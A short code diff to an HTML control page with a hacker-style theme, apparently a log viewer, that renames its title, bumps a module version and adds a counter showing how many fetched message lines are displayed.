@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DECRYPTOR // INTERCEPT PANEL</title>
+    <title>DECRYPTOR // CONTROL PANEL</title>
     <style>
         :root { --n: #00ff41; --b: #050505; --r: #ff0055; }
         * { box-sizing: border-box; }
@@ -13,6 +13,7 @@
         }
         header { border-bottom: 2px solid var(--n); padding-bottom: 15px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
         
+        .stats { font-size: 14px; color: #fff; background: rgba(0,255,65,0.1); padding: 5px 15px; border: 1px solid var(--n); }
         .master-key { background: #000; border: 1px solid var(--r); color: var(--r); padding: 10px; width: 250px; outline: none; font-family: inherit; }
         
         #purge-btn { background: var(--r); color: #000; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
@@ -29,7 +30,10 @@
 <body>
 
     <header>
-        <div>[ INTERCEPT_MODULE_V1.1 ]</div>
+        <div>
+            <div>[ INTERCEPT_MODULE_V1.2 ]</div>
+            <div id="counter" class="stats" style="margin-top:5px;">MESSAGES_CAPTURED: 0</div>
+        </div>
         <input type="text" id="m-key" class="master-key" placeholder="MASTER_DECRYPT_KEY">
         <button id="purge-btn" onclick="clearLogs()">! PURGE_ALL_LOGS !</button>
     </header>
@@ -49,6 +53,7 @@
     const API = '/api';
     const logs = document.getElementById('logs');
     const masterKey = document.getElementById('m-key');
+    const counter = document.getElementById('counter');
 
     function crypt(t, k) {
         if (!k) return t;
@@ -71,6 +76,7 @@
             const lines = data.split('\n').filter(l => l.trim());
             const key = masterKey.value;
 
+            counter.innerText = `MESSAGES_CAPTURED: ${lines.length}`;
             logs.innerHTML = ""; 
 
             lines.forEach((line) => {
